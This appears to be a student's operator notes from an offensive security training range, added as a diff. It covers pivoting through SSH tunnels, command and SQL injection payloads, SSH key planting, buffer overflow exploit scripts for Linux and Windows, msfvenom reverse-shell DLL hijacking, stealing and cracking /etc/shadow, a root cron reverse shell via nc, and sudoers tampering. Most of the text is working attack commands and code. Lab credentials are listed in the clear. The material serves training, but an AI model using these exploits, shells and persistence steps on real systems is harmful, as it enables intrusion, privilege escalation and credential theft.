@@ -1,0 +1,415 @@
+###OpNotes Security
+
+-----------------------------------------------------------------------------------------
+#Day 1 Recon
+
+ssh -MS /tmp/jump student@10.50.33.69
+ping sweep scan for all machines in the 192.168.28.96/27 network
+ssh -S /tmp/jump -O forward -L1111:192.168.28.111:80 DUMB
+ssh -S /tmp/jump -O forward -L2222:192.168.28.111:8080 DUMB
+ssh -S /tmp/jump -O forward -D 9050 hater
+nmap scan for all ports and see which ones are viable (alt ssh ports, ftp, http, etc)
+
+ssh -S /tmp/jump -O forward -L:3333:192.168.28.120:4242 hater
+ssh -MS /tmp/T1 student@127.0.0.1 -p3333
+ping sweep scan on that machine for all machines in the 192.168.150.224/27 network
+ssh -S /tmp/jump -O cancel -D 9050 hater
+	need to close the current dynamic tunnel to create a new one
+ssh -S /tmp/T1 -O forward -D 9050 hater
+nmap scan for smb-os-discovery.nse and find the flag
+
+----------------------------------------------------------------------------------------
+#Day 2 Web Exploitation
+
+ssh -S /tmp/jump -O forward -D 9050 hater
+	proxychains nmap scan on the 10.100.28.40 ip
+		80 and 4444 (alt ssh)
+ssh -S /tmp/jump -O forward -L4445:10.100.28.40:4444 hater
+ssh -S /tmp/jump -O forward -L4446:10.100.28.40:80 hater
+firefox
+http://127.0.0.1:4446
+http://127.0.0.1:4446/net_test/industry_check.php
+	path to test: ; whoami
+
+; ls -la /home
+	find romanoff directory
+; ls -la /home/romanoff@mi.ru
+	find contracts file
+; cat /home/romanoff@mi.ru/contracts
+	boom flag
+
+injection.permissions;#
+
+
+keygen malicious file
+ssh-keygen -t rsa
+cat /home/student/.ssh/id_rsa.pub
+ls -la /home/billybob/.ssh (search for one before you make it)
+mkdir /home/billybob/.ssh
+echo "<key>" >> /home/billybob/.ssh/authorized_keys
+cat /home/billybob/.ssh/authorized_keys
+ssh -MS /tmp/T1web billybob@127.0.0.1 -p4445
+
+ssh -S /tmp/T1web -O forward -L4447:10.100.28.55:80 hater
+
+cd /var/www/html
+ls
+	find TT
+cd TT
+ls
+	find cookie file
+cat the file
+
+go to inspector
+look at javascipt, find fuction
+find where the button for check_password
+change the function that gives cert to the button instead of checking password
+
+10.100.28.55 - Took my online training from this following website
+
+
+-----------------------------------------------------------------------------------
+Web Exploitation day 2 SQL Injection
+
+
+ssh -S /tmp/jump -O forward -D 9050 hater
+ssh -S /tmp/jump -O forward -L4448:10.100.28.48:80 hater
+
+
+1 UNION select id,date,order FROM sqlinjection.payments;#
+
+1 UNION select id,level,name FROM sqlinjection.permissions;#
+
+1 UNION select id,name,description FROM sqlinjection.categories;#
+
+1 UNION select id,username,password FROM sqlinjection.members;#
+
+1 UNION select id,quantity,product FROM sqlinjection.orderlines;#
+
+1 UNION select id,date,member FROM sqlinjection.orders;#
+
+1 UNION select id,name,description FROM sqlinjection.products;#
+
+1 UNION select comment,mime,id FROM sqlinjection.share4;#
+
+
+
+Create admin account
+
+ We need to backspace the quote out so it finishes the email field (or whatever field is before the value you are trying to implement, then add a comma as a seperator and finish it with an end comman comment out syntax (;#)
+
+L\',1);#
+
+--------------------------------------------------------------------------------------
+
+Reverse Engineering Day 1
+
+T1
+Hostname: web.site.donovia
+IP: 192.168.28.111
+OS: unknown
+Creds: comrade::StudentWebExploitPassword
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Extract approved binaries under directory titled "longTermStorage".
+
+Run exe
+	test exe
+		find it wants "enter ......"
+				follow function
+		find continuing functions
+	find the value it wants for success
+find the key
+
+To make patch inside of the file. Find the return value that is accepted for a success return. Change the return value to ALWAYS give success no matter what is inputed. 
+
+Ie. 
+	return 12 (this needs to equal 40 aswell)
+
+	if a = 40
+		return success
+	Then export the file into a pe and run it and test if the patching worked. 
+
+
+--------------------------------------------------------------------------------------
+
+### Exploit Development
+
+Q1. ELF1
+
+had to scp the inventory.exe executable to my linops machine (or just download it from the ctfd challenge using firefox)
+
+./inventory.exe
+	buffer overflow it, check for segmentation fault error
+
+gdb inventory.exe
+	pdisass main
+		Keep going until you find a function that is read and vulnerable to buffer overflow
+	
+#Begin the script
+
+1. script take the pattern from wiremask
+	overflow = "pattern"
+2. gdb func - Finding EIP
+	run <<< $(python script)
+3. find EIP - Copy hex
+	copy hex into wiremask register value
+4. Getting offset from wiremask, take into script
+	overflow = "A" * offset
+	eip = "B" * 4 (32 bit value)
+5. gdb func - testing control of EIP
+	run <<< $(python script)
+6. env - gdb func
+	show env
+		lists items
+	unset env (whatever shows up)
+7. Manually overflow 
+	run
+	input a ton of characters
+8. info proc map
+	lists processes
+9. find /b (start of heap),(start of stack),0xff,0xe4
+	find start of heap by finding heap, line below it is the start
+	find start of stack by finding stack, line above it is the start
+	Instruction Pointer is JUMP ESP specified by 0xff(jump) and 0xe4(esp)
+10. Copy like 5-10 lines
+	comment out in scipt for grabbing later just in case error
+11. Make actual eip tester in reverse endian 
+	eip = "\xcf\x44\x55\x66"
+		REVERSE BYTE ORDER not reverse order
+12. NOP sled
+	nop = "\x90" * 10
+	x90 is a constant
+13. Shellcode 
+	msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
+	May have to generate shellcode multiple times
+14. paste shellcode into script
+
+15. run it out of gdb as you regularly would. 
+	./func <<< $(python script)
+
+16. verify you are root
+17. change msfvenom to find info. cat /etc/passwd
+	copy shellcode into script
+18. repeat 15
+
+
+When you copy this over to the machine you want to exploit. You need to redo steps 6-11
+then using the correct Shellcode (ran on linops for the syntax of command to run)
+find the information you want.
+
+
+--------------------------------------------------------------------------------------
+
+Windows Buffer Overflow
+
+###ECPLOIT DEVOLOPMENT###
+make sure gbd installed already do not install anything not allowed
+put script in tmp directory
+after putting the script onto the machine do the info proc map process again
+'''
+Windows
+get exe onto the windows op station then run it in immunity debugger
+get whatever port it opens and make a socket to find how much the offset is then test
+	FINDING THE OFFSET
+		#!/usr/bin/python
+		import socket
+		import os
+		import sys
+		host = "192.168.1.129"
+		port = 9999
+		buffer = "amount from wiremask.eu"
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host,port))
+		print s.recv(1024)
+		print "[+] Sending exploit..."
+		s.send("TRUN /.:/ " + buffer)
+		print s.recv(1024)
+		s.close()
+	
+	
+	TESTING THE OFFSET
+		#!/usr/bin/python
+		import socket
+		import os
+		import sys
+		host = "192.168.1.129"
+		port = 9999
+		buffer = "A"*2002
+		buffer += "BBBB"
+		buffer += "C"*(5000-len(buffer))
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host,port))
+		print s.recv(1024)
+		print "[+] Sending exploit..."
+		s.send("TRUN /.:/ " + buffer)
+		print s.recv(1024)
+		s.close()
+	FINDING THE BAD CHARS	(most likely 0x00)	
+		#!/usr/bin/python
+		import socket
+		import os
+		import sys
+		host = "192.168.1.129"
+		port = 9999
+		badchars = ("<!mons bytearray in immunity debugger>")
+		buffer = "A"*2002
+		buffer += "BBBB"
+		buffer += badchars
+		buffer += "C"*(5000-len(buffer))
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host,port))
+		print s.recv(1024)
+		print "[+] Sending exploit..."
+		s.send("TRUN /.:/ " + buffer)
+		print s.recv(1024)
+		s.close()
+		
+	!mona jmp -r esp -m "essfunc.dll" to get the jmp esp
+	then create the shell code with:
+		msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
+			###alternate way###msfvenom
+			use multi/handler
+			set payload windows/meterpreter/reverse_tcp
+			set lhost 0.0.0.0
+			set lport 4444
+			msfvenom -p windows/meterpreter/reverse_tcp lhost=<linux ip>
+			
+			
+			import socket
+			import os
+			import sys
+			host = "192.168.1.129"
+			port = 9999
+			# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
+			# Payload size: 355 bytes
+			shellcode = "SHELLCODE GIVEN"
+			buffer = "A"*2002
+			buffer += "\xAF\x11\x50\x62"        # 625011AF   JMP ESP from essfunc.dll
+			buffer += "\x90"*16                 # nopsled
+			buffer += shellcode
+			buffer += "C"*(5000-len(buffer))
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((host,port))
+			print s.recv(1024)
+			print "[+] Sending exploit..."
+			s.send("TRUN /.:/ " + buffer)
+			print s.recv(1024)
+			s.close()
+			test on the win ops then when test successful do it on what you are trying to exploit
+			may need tunnels to the 4444 and 9999 ports(most likely do)
+			open a nc connection on that tunnel
+			
+'''
+
+---------------------------------------------------------------------------------------
+
+## Windows Exploitation
+
+ssh -MS /tmp/jump student@10.50.33.69
+ssh -S /tmp/jump -O forward -L 2000:192.168.28.105:2222 dumb
+ssh -MS /tmp/pivot comrade@127.0.0.1 -p2000
+ssh -S /tmp/pivot -O forward -L 4000:192.168.28.5:3389 dumb
+xfreerdp /v:localhost:4000 /u:comrade /dynamic-resolution +glyph-cache +clipboard
+	went to file directory to find comrade
+		system file to view event viewer
+	services application
+		filter on description
+		find MemoryStatus
+
+scp student@10.50.32.144:/home/student/bad.dll C:\MemoryStatus\
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.50.32.144 LPORT=4444 -f dll > hijackmeplz.dll
+
+scp onto windows target
+
+msfconsole
+	use multi/handler
+	set payload windows/shell_reverse_tcp
+	set lhost 0.0.0.0
+	set lport 4444
+	run
+
+Restart windows machine because it runs on AUTOMATIC startup type
+boom done
+
+-------------------------------------------------------------------------------------
+
+## Linux Exploitation
+
+Pivot
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+PSP: rkhunter
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: unknown
+IP: 192.168.28.27
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+T2
+Hostname: unknown
+IP: 192.168.28.12
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+#OPNOTES
+
+ssh -S /tmp/pivot -O forward -D 9050 hater
+ssh -S /tmp/pivot -O forward -L 2001:192.168.28.27:22 dummy
+ssh -MS /tmp/T1 comrade@127.0.0.1 -p2001
+ssh -S /tmp/pivot -O forward -L 2002:192.168.28.12:22 dummy
+ssh -MS /tmp/T2 comrade@127.0.0.1 -p2002
+
+in lin2
+	vim ls (in tmp directory)
+		/bin/cat /home/billybob/* >> /tmp/billy.txt
+		/usr/bin/sudo /bin/cat /etc/shadow > /tmp/shadow.txt
+		scp over both files to lin ops
+			john --wordlist=billy.txt shadow.txt
+		back on lin2
+			su zeus
+				cd /root
+				cat flag file
+				cd /etc/cron.d
+					vim popularity-contest
+			*/1 * * * *   root    nc 192.168.28.135 33403 -e /bin/bash
+					wait for it to beacon out. Check /tmp dir for flag
+in lin1
+	find / -type f -perm /2000 2>/dev/null
+		cd /vat/tmp/testbed
+			./unknown
+				needs two arguments first is file modified second is info
+./unknown "/etc/sudoers" "comrade ALL=(ALL) NOPASSWD:ALL"
+			then just sudo ls -latr /root
+				then sudo cat /root/flag
+
+ xfreedrp /v:localhost:1230 /u:username /dynamic-resolution +glyph-cache +clipboard
+	after the rdp tunnel has been made buddy ol pal
+
+
+
+
+
+
+
+
+
+
+
+
